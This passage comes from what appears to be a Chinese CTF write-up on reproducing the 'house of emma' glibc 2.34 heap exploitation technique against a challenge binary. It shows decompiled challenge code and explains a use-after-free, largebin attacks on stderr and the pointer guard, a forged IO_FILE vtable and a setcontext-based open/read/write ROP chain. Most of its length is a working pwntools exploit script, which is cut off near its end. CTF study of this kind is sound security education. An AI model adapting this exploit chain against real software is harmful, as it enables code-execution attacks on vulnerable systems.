class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_16D5(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Pls input the opcode&quot;</span>);</span><br><span class="line">    s = <span class="built_in">malloc</span>(<span class="number">0x2000</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x500</span>uLL);</span><br><span class="line">    sub_1289(s);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是输入之间是没用输出的，就直接把要选项参数直接一起输入，然后调用5返回main，然后一直循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1289</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( *a1 &amp; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(a1);</span><br><span class="line">        a1 += <span class="number">4LL</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Malloc Done&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete(a1);</span><br><span class="line">        a1 += <span class="number">2LL</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Del Done&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show(a1);</span><br><span class="line">        a1 += <span class="number">2LL</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Show Done&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit(a1);</span><br><span class="line">        a1 += *(a1 + <span class="number">2</span>) + <span class="number">4LL</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Edit Done&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>add：限制chunk_size在0x410到0x500之间，且idx小于等于0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_149C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a1 + <span class="number">1</span>);</span><br><span class="line">  v3 = *(a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x40F</span>u || v3 &gt; <span class="number">0x500</span>u || v2 &gt; <span class="number">0x10</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_ptr_4040[v2] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v3);</span><br><span class="line">  result = chunk_size_40c0;</span><br><span class="line">  chunk_size_40c0[v2] = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete：uaf<br>show：正常打印<br>edit：正常修改</p><h4 id="思路及过程"><a href="#思路及过程" class="headerlink" title="思路及过程"></a>思路及过程</h4><p>有了上文章house of emma的学习这题也就有了大致的思路，<br>存在uaf，largebin attack挺方便的，先去泄露地址，然后largebin修改stderr、libc_base-0x2890，然后就是布置偏移、伪造IO_FILE，不过实际过程还是有点绕<br>1、先泄露地址<br>2、然后利用 largebin attack去修改stderr：<br>3、利用largebin attack修改libc_base-0x2890：<br>4、修改top_chunk的size，为触发assert做准备，前几步都比较常规吧、就不粘payload的了<br>5、伪造IO_FILE：网上师傅可能伪造了<code>_IO_write_ptr</code>等数据，但xshhc师傅分享了这条利用链过程，实际只需要<code>_lock</code>写入一个可写入的地址，_mode也不用限制，最重要的就是修改vtable</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_io = p64(<span class="number">0</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(heap_base)  <span class="comment"># _lock 可写地址</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(iO_cookie_jumps+<span class="number">0x40</span>)  <span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi = stderr </span></span><br><span class="line"><span class="comment">#_io_cooklie_write --&gt; rdi+0xf0</span></span><br><span class="line">fake_io += p64(srop_adr)  <span class="comment"># 执行gadget_adr时rdi0xe0</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(ROL(gadget_adr ^ (heap_base + <span class="number">0x2ae0</span>),<span class="number">0x11</span>))<span class="comment">#0xf0</span></span><br></pre></td></tr></table></figure><p>_IO_cookie_jumps + 0x40 + 0x38 –&gt; _IO_cookie_write</p><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694872826262-efaa3d3a-f9d8-4513-b318-33f0851dce2f.png" alt="img"></p><p>进入_IO_cookie_write之后 两个重要的地方 (rdi  &#x3D; stderr) 这里可以回溯一下rdi，发现是开始从stderr中赋值来的<br>rax  &#x3D;  rdi+0xf0 (要绕过检测)    –&gt;   call rax<br>rdi  &#x3D;  rdi + 0xe0 </p><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694873058806-327cfd72-e3d2-45ee-98cf-8d25f978c94d.png" alt="img"></p><p>所以我们可以控制这两块地址去控制执行流，但怎么利用call去执行orw呢？这里就接触到了一个新知识<br>思路就是还是去利用setcontext+61–&gt;orw，但setcontext需要rdx，这里去找一个符合的gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so<span class="number">.6</span> --only <span class="string">&quot;mov|call&quot;</span> | grep <span class="string">&quot;rdx&quot;</span> | grep <span class="string">&quot;rdi&quot;</span> </span><br></pre></td></tr></table></figure><p>就是通过我们已经控制的rdi去控制rdx，并可以继续控制执行流的magic_gadget (自己根本找不到qwq)</p><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694873589848-8683591b-6a23-43c6-aaa8-2b2a7c19571a.png" alt="img"></p><p>然后去控制rsop_adr+0x8以及srop_adr+0x8+0x20，然后就可以去执行setcontext+61–&gt;orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pay = p64(<span class="number">0</span>) + p64(srop_adr) <span class="comment">#rdx=srop_adr</span></span><br><span class="line"><span class="comment">#然后call rdx+0x20 --&gt; sentcontext+61</span></span><br><span class="line">pay += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + p64(setcontext_addr+<span class="number">61</span>) <span class="comment">#p64(srop_adr+0xf8+0x10) #</span></span><br><span class="line"><span class="comment">#rsp = rdx + 0xa0</span></span><br><span class="line">pay += <span class="built_in">bytes</span>(frame).ljust(<span class="number">0xF8</span>, <span class="string">b&#x27;\x00&#x27;</span>)[<span class="number">0x28</span>:]+<span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)+flat(orw)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">payload = edit(<span class="number">0</span>,fake_io) + edit(<span class="number">1</span>,pay) + add(<span class="number">8</span>,<span class="number">0x450</span>) + p8(<span class="number">5</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,payload)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = srop_adr + <span class="number">0xf8</span><span class="comment">#flag</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line"><span class="comment">#frame.r13 = heap_base#</span></span><br><span class="line">frame.rsp = srop_adr + <span class="number">0xF8</span> + <span class="number">0x10</span><span class="comment"># --&gt;orw</span></span><br><span class="line">frame.rip = ret</span><br></pre></td></tr></table></figure><p>开始一直以为网上师傅是有执行rt_sigreturn<strong>，</strong>调试了好久qwq，自己都蒙圈了，最后发这里只是利用这个来布置栈qwq，顺便把open的参数也设置好了</p><h4 id="还未解决的小疑惑"><a href="#还未解决的小疑惑" class="headerlink" title="还未解决的小疑惑"></a>还未解决的小疑惑</h4><p>因为我写orw一直都是 open、read、write函数来调用，但这题好像不太行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">orw = flat(pop_rdi,srop_adr+<span class="number">0xf8</span>,pop_rsi,<span class="number">0</span>,op,</span><br><span class="line">pop_rdi,<span class="number">3</span>,pop_rsi,srop_adr+<span class="number">0x200</span>,pop_rdx_rbx,<span class="number">0x100</span>,<span class="number">0</span>,re,</span><br><span class="line">pop_rdi,<span class="number">1</span>,pop_rsi,srop_adr+<span class="number">0x200</span>,pop_rdx_rbx,<span class="number">0x40</span>,<span class="number">0</span>,wr</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>最后还是用的网上师傅的orw，我感觉是没啥区别的 orz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">orw = [</span><br><span class="line">    pop_rax,  <span class="comment"># sys_open(&#x27;flag&#x27;, 0)</span></span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    syscall,</span><br><span class="line"> </span><br><span class="line">    pop_rax,  <span class="comment"># sys_read(flag_fd, heap, 0x100)</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    srop_adr + <span class="number">0x200</span>,</span><br><span class="line">    syscall,</span><br><span class="line"> </span><br><span class="line">    pop_rax,  <span class="comment"># sys_write(1, heap, 0x100)</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    srop_adr + <span class="number">0x200</span>,</span><br><span class="line">    syscall</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694874539243-25bb4b77-75a3-44ae-8d33-4e0ae40a6ba3.png" alt="img"></p><h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile = <span class="string">&#x27;./emma&#x27;</span></span><br><span class="line">io=process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line"><span class="keyword">return</span> p8(<span class="number">1</span>) + p8(idx) + p16(size)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):<span class="comment">#uaf</span></span><br><span class="line"><span class="keyword">return</span> p8(<span class="number">2</span>) + p8(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"><span class="keyword">return</span> p8(<span class="number">3</span>) + p8(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):<span class="comment">#无溢出</span></span><br><span class="line"><span class="keyword">return</span> p8(<span class="number">4</span>) + p8(idx) + p16(<span class="built_in">len</span>(content)) + content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, key</span>):</span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bin()[2]------------&gt;&quot;</span>,<span class="built_in">bin</span>(content)[<span class="number">2</span>:])<span class="comment">#bin以ob开头</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bin()[2]------------&gt;&quot;</span>,<span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tmp------------&gt;&quot;</span>,tmp[key:])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tmp------------&gt;&quot;</span>,tmp[:key])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------&gt;&quot;</span>,tmp[key:] + tmp[:key])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"><span class="comment">#libc2.34 保护全开   calloc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------------------------------泄露地址   放入largebin</span></span><br><span class="line">pay = add(<span class="number">0</span>,<span class="number">0x410</span>)+add(<span class="number">0xa</span>,<span class="number">0x410</span>)+add(<span class="number">1</span>,<span class="number">0x420</span>)</span><br><span class="line">pay += add(<span class="number">2</span>,<span class="number">0x410</span>) + delete(<span class="number">1</span>)</span><br><span class="line">pay += add(<span class="number">3</span>,<span class="number">0x430</span>) + show(<span class="number">1</span>) + p8(<span class="number">5</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,pay)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">1104</span>-libc.symbols[<span class="string">&#x27;main_arena&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base---&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line">pay = edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) + show(<span class="number">1</span>)+ p8(<span class="number">5</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,pay)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2ae0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base---&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------largebin attack 修改stderr</span></span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]<span class="comment">#_IO_2_1_stderr</span></span><br><span class="line"></span><br><span class="line">pay1 = p64(libc_base+<span class="number">0x1f30b0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x2ae0</span>)+p64(stderr-<span class="number">0x20</span>)<span class="comment">#修改</span></span><br><span class="line"><span class="comment">#布置fd、bk、nextsize_fd、nextsize_bk使largebi写入地址为libc_base + 0x22a0</span></span><br><span class="line">pay2 = p64(libc_base+<span class="number">0x1f30b0</span>)+p64(heap_base + <span class="number">0x2ae0</span>)*<span class="number">3</span><span class="comment">#</span></span><br><span class="line">pay3 = p64(heap_base+<span class="number">0x22a0</span>)+p64(libc_base+<span class="number">0x1f30b0</span>)+p64(heap_base+<span class="number">0x22a0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload =  delete(<span class="number">0</span>) + edit(<span class="number">1</span>,pay1) + add(<span class="number">4</span>,<span class="number">0x430</span>)<span class="comment">#largebin</span></span><br><span class="line">payload += edit(<span class="number">1</span>,pay3) + edit(<span class="number">0</span>,pay2) </span><br><span class="line">payload += add(<span class="number">0</span>,<span class="number">0x410</span>) + add(<span class="number">1</span>,<span class="number">0x420</span>) + p8(<span class="number">5</span>)<span class="comment">#恢复largebin</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#--------------------------------largebin attack 修改__pointer_chk_guardi r fs_base  fs[0x30]</span></span><br><span class="line"><span class="comment">#guard = libc_base + 0x3ee770</span></span><br><span class="line">guard = libc_base - <span class="number">0x2890</span></span><br><span class="line"></span><br><span class="line">pay1 = p64(libc_base+<span class="number">0x1f30b0</span>)*<span class="number">2</span>+p64(heap_base + <span class="number">0x2ae0</span>)+p64(guard-<span class="number">0x20</span>)<span class="comment">#修改</span></span><br><span class="line">pay2 = p64(libc_base+<span class="number">0x1f30b0</span>)*<span class="number">2</span>+p64(heap_base + <span class="number">0x2ae0</span>)*<span class="number">2</span><span class="comment">#恢复</span></span><br><span class="line"></span><br><span class="line">payload = delete(<span class="number">1</span>) + add(<span class="number">4</span>,<span class="number">0x450</span>) + edit(<span class="number">1</span>,pay1)</span><br><span class="line">payload += delete(<span class="number">0</span>) + add(<span class="number">5</span>,<span class="number">0x450</span>) + add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">payload += edit(<span class="number">1</span>,pay2) + add(<span class="number">1</span>,<span class="number">0x420</span>) + p8(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#------------------------------------------------------修改top_chunnk</span></span><br><span class="line"></span><br><span class="line">payload = delete(<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">6</span>,<span class="number">0x430</span>)</span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x430</span>+flat(<span class="number">0</span>,<span class="number">0x300</span>)</span><br><span class="line">payload += edit(<span class="number">5</span>,pay) + p8(<span class="number">5</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">srop_adr = heap_base + <span class="number">0x2ae0</span>+<span class="number">0x10</span></span><br><span class="line"><span class="comment">#ROPgadget --binary ./libc.so.6 --only &quot;mov|call&quot; | grep &quot;rdx&quot; | grep &quot;rdi&quot; | grep &quot;rdx&quot;</span></span><br><span class="line">gadget_adr = libc_base + <span class="number">0x0146020</span></span><br><span class="line">setcontext_addr = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">iO_cookie_jumps = libc_base + libc.symbols[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造跳表</span></span><br><span class="line">fake_io = p64(<span class="number">0</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(heap_base)  <span class="comment"># _lock 可写地址</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(<span class="number">1</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(iO_cookie_jumps+<span class="number">0x40</span>)  <span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi = stderr </span></span><br><span class="line"><span class="comment">#_io_cooklie_write --&gt; rdi+0xf0</span></span><br><span class="line">fake_io += p64(srop_adr)  <span class="comment"># 执行gadget_adr时rdi0xe0</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(ROL(gadget_adr ^ (heap_base + <span class="number">0x2ae0</span>),<span class="number">0x11</span>))<span class="comment">#0xf0</span></span><br><span class="line"><span class="comment">#执行gadget --&gt; rdx = rdi+8(stderr+8) --&gt; call rdx+0x20</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x02daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x037c0a</span></span><br><span class="line">pop_rdx_rbx = libc_base + <span class="number">0x087729</span></span><br><span class="line">op = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">re = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">wr = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = srop_adr + <span class="number">0xf8</span><span class="comment">#flag</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line"><span class="comment">#frame.r13 = heap_base#</span></span><br><span class="line">frame.rsp = srop_adr + <span class="number">0xF8</span> + <span class="number">0x10</span><span class="comment"># --&gt;orw</span></span><br><span class="line">frame.rip = pop_rdi + <span class="number">1</span>  <span 